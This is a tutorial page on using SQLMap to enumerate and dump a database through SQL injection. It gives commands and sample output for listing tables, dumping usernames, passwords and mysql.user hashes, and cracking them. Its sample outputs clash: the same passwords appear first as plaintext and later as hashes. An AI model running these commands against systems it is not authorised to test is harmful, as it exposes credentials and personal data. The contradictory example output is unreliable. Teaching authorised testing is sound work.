---
title: 'Database Enumeration'
description: 'Extract database names, tables, columns, and data using SQLMap. Learn the systematic enumeration workflow from discovery to full data dump.'
icon: material/database-search
tags:
  - sqlmap
  - enumeration
  - database
---

# Database Enumeration

Once you've confirmed SQL injection, the real work begins: **extracting valuable data from the database**. This section walks you through the systematic enumeration workflow.

---

## The Enumeration Workflow

Always follow this order — each step builds on the previous one:

```
Step 1: Fingerprint the DBMS
    ↓
Step 2: List all databases
    ↓
Step 3: List tables in the target database
    ↓
Step 4: List columns in the target table
    ↓
Step 5: Dump the data
```

Think of it like navigating a file system: you first need to know which drive you're on, then which folders exist, then which files are in those folders, before you can read the file contents.

---

## Step 1: Fingerprint the Database

Before enumerating anything, gather intelligence about the database:

```bash title="Basic DBMS Reconnaissance"
sqlmap -r request.txt \
  --banner \
  --current-user \
  --current-db \
  --is-dba \
  --batch
```

### What Each Flag Returns

#### `--banner`
Returns the exact DBMS version string:

```text
[INFO] the back-end DBMS is MySQL
banner: '8.0.30-0ubuntu0.22.04.1'
```

**Why this matters:** Different MySQL versions support different features. For example, `INFORMATION_SCHEMA` was introduced in MySQL 5.0. If you're on MySQL 4.x (rare these days), enumeration works differently.

#### `--current-user`
Returns the database user running the queries:

```text
current user: 'webapp@localhost'
```

**Why this matters:** The user's privileges determine what you can do:

- `root@localhost` or `sa` → Full admin access, can read files and execute OS commands
- `webapp@localhost` → Limited access, probably can only query specific databases

#### `--current-db`
Returns the database the application is currently using:

```text
current database: 'ecommerce'
```

**Why this matters:** This is your **primary target**. Start enumeration here before exploring other databases.

#### `--is-dba`
Checks if the current user has Database Administrator privileges:

```text
current user is DBA: True
```

**Why this matters:** If `True`, you can potentially:

- Read/write files on the server (`--file-read`, `--file-write`)
- Execute OS commands (`--os-shell`)
- Access all databases (not just the current one)
- Create new users
- Modify database configurations

---

## Step 2: List All Databases

```bash
sqlmap -r request.txt --dbs --batch
```

```text title="Example Output"
[INFO] fetching database names
available databases [5]:
[*] ecommerce
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```

### Understanding System Databases

| Database | What It Contains | Should You Dump It? |
|---|---|---|
| `ecommerce` | **Application data** — users, products, orders | ✅ Yes — primary target |
| `information_schema` | Database metadata — table/column definitions | ⚠️ Not usually — used for enumeration queries |
| `mysql` | MySQL user accounts and privileges | ✅ Yes — contains password hashes |
| `performance_schema` | Performance metrics and instrumentation | ❌ No — not useful for pentesting |
| `sys` | System views for monitoring | ❌ No — not useful for pentesting |

!!! tip "Always Check the `mysql` Database"

    If the user is DBA, the `mysql.user` table contains **password hashes** for all database users. These can be cracked offline:

    ```bash
    sqlmap -r request.txt -D mysql -T user -C user,authentication_string --dump --batch
    ```

---

## Step 3: List Tables in a Database

```bash title="List tables in the 'ecommerce' database"
sqlmap -r request.txt -D ecommerce --tables --batch
```

```text title="Example Output"
[INFO] fetching tables for database: 'ecommerce'
Database: ecommerce
[8 tables]
+-------------------+
| users             |
| products          |
| orders            |
| order_items       |
| categories        |
| reviews           |
| sessions          |
| password_resets   |
+-------------------+
```

### Identifying High-Value Tables

Look for these table names — they're your primary targets:

| Table Pattern | Likely Contains |
|---|---|
| `users`, `accounts`, `members`, `admins` | Credentials, PII |
| `passwords`, `credentials`, `auth` | Authentication data |
| `sessions`, `tokens` | Active session data |
| `password_resets`, `reset_tokens` | Password reset links |
| `payments`, `transactions`, `billing` | Financial data |
| `configs`, `settings`, `options` | Application configuration |
| `api_keys`, `secrets` | API credentials |
| `logs`, `audit`, `activity` | User activity logs |

---

## Step 4: List Columns in a Table

```bash title="List columns in the 'users' table"
sqlmap -r request.txt -D ecommerce -T users --columns --batch
```

```text title="Example Output"
[INFO] fetching columns for table 'users' in database 'ecommerce'
Database: ecommerce
Table: users
[7 columns]
+----------------+--------------+
| Column         | Type         |
+----------------+--------------+
| id             | int          |
| username       | varchar(50)  |
| email          | varchar(100) |
| password       | varchar(255) |
| role           | varchar(20)  |
| created_at     | datetime     |
| last_login     | datetime     |
+----------------+--------------+
```

The `password` column is `varchar(255)` — likely stores hashed passwords (bcrypt, sha256, etc.).

---

## Step 5: Dump the Data

### Dump Specific Columns (Recommended)

Always start by dumping only the columns you need — it's faster and less noisy:

```bash title="Dump only usernames and passwords"
sqlmap -r request.txt \
  -D ecommerce -T users -C username,password \
  --dump --batch
```

```text title="Example Output"
[INFO] fetching entries of column(s) 'username,password' for table 'users' in database 'ecommerce'
Database: ecommerce
Table: users
[4 entries]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$kY5qW3pN8j1v9gH7mE0Fj.RfQ2oP1lBnA3cD4eK5hI6jL7mN8oQ |
| john     | password123                                                  |
| jane     | $2y$10$xQ4wE3rT6yU7iO8pA9sD0f.GhJ1kL2mN3bV4cX5zW6aS7dF8gH9i |
| mike     | letmein                                                      |
+----------+--------------------------------------------------------------+
```

!!! danger "Plaintext Passwords Found!"

    Notice that `john` and `mike` have **plaintext passwords** while `admin` and `jane` have **bcrypt hashes**. This is a critical finding — the application is inconsistently hashing passwords! Report both the SQLi vulnerability and the insecure password storage.

### Dump an Entire Table

```bash
sqlmap -r request.txt -D ecommerce -T users --dump --batch
```

### Dump the Entire Database

```bash
sqlmap -r request.txt -D ecommerce --dump-all --batch
```

### Dump ALL Databases (Nuclear Option)

```bash
sqlmap -r request.txt --dump-all --batch
```

!!! warning "Data Volume Warning"

    Dumping all databases can be **extremely slow** and generate **massive amounts of traffic**. In a real engagement:

    1. Start with specific high-value tables
    2. Only dump full databases if required by the scope
    3. Consider the target's monitoring capabilities

### Limiting Dump Rows

```bash title="Dump only the first 10 rows"
sqlmap -r request.txt -D ecommerce -T users --dump --start=1 --stop=10 --batch
```

```bash title="Dump rows 50 through 100"
sqlmap -r request.txt -D ecommerce -T users --dump --start=50 --stop=100 --batch
```

### Filtering with WHERE Clause

```bash title="Dump only admin users"
sqlmap -r request.txt \
  -D ecommerce -T users \
  --dump \
  --where="role='admin'" \
  --batch
```

---

## Automatic Hash Cracking

When SQLMap dumps password hashes, it automatically detects the hash type and offers to crack them:

```text
[INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further 
processing with other tools [y/N] y
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
```

SQLMap includes a **built-in wordlist** and uses it to attempt cracking. If it finds a match:

```text
[INFO] starting dictionary-based cracking (sha256_generic_passwd)
[INFO] cracked password 'password123' for user 'john'
[INFO] cracked password 'letmein' for user 'mike'

Database: ecommerce
Table: users
[4 entries]
+----------+--------------------------------------------------------------+----------+
| username | password                                                     | cracked  |
+----------+--------------------------------------------------------------+----------+
| admin    | $2y$10$kY5qW3pN8j1v9gH7mE0Fj.RfQ2oP1lBnA3cD4eK5hI6jL7mN8oQ |          |
| john     | 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 | password123 |
| jane     | $2y$10$xQ4wE3rT6yU7iO8pA9sD0f.GhJ1kL2mN3bV4cX5zW6aS7dF8gH9i |          |
| mike     | 7c6a180b36896a65c59a12c6dce21346f4c37fbbf8a18bee42ab8f37a2ac58bb | letmein  |
+----------+--------------------------------------------------------------+----------+
```

For hashes that SQLMap can't crack, export them and use **Hashcat** or **John the Ripper** with better wordlists:

```bash title="Find the dumped hash file"
ls ~/.sqlmap/output/target.com/dump/ecommerce/
```

---

## Getting User Privileges

```bash title="List privileges for all users"
sqlmap -r request.txt --privileges --batch
```

```text title="Example Output"
[INFO] fetching database users privileges
database management system users privileges:
[*] 'root'@'localhost' (administrator) [29]:
    privilege: ALTER
    privilege: CREATE
    privilege: DELETE
    privilege: DROP
    privilege: FILE
    privilege: INSERT
    privilege: SELECT
    privilege: SUPER
    privilege: UPDATE
    ...

[*] 'webapp'@'localhost' [4]:
    privilege: DELETE
    privilege: INSERT
    privilege: SELECT
    privilege: UPDATE
```

**Key privileges to look for:**

| Privilege | Significance |
|---|---|
| `FILE` | Can read/write files on the server |
| `SUPER` | Full admin access |
| `PROCESS` | Can see running queries (info leakage) |
| `SHUTDOWN` | Can shut down the DBMS (DoS potential) |
| `CREATE USER` | Can create new database users |
| `GRANT` | Can give privileges to other users |

---

## Getting Password Hashes Directly

```bash title="Dump DBMS user password hashes"
sqlmap -r request.txt --passwords --batch
```

```text title="Example Output"
[INFO] fetching database users password hashes
database management system users password hashes:
[*] root [1]:
    password hash: *6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9
[*] webapp [1]:
    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19

do you want to perform a dictionary-based attack against retrieved password
hashes? [Y/n/q] Y
[INFO] using hash method 'mysql_passwd'
[INFO] cracked password 'test' for user 'webapp'
```

---

## Listing Database Roles (PostgreSQL/MSSQL)

```bash
sqlmap -r request.txt --roles --batch
```

This shows which roles the database user belongs to, which affects what actions they can perform.
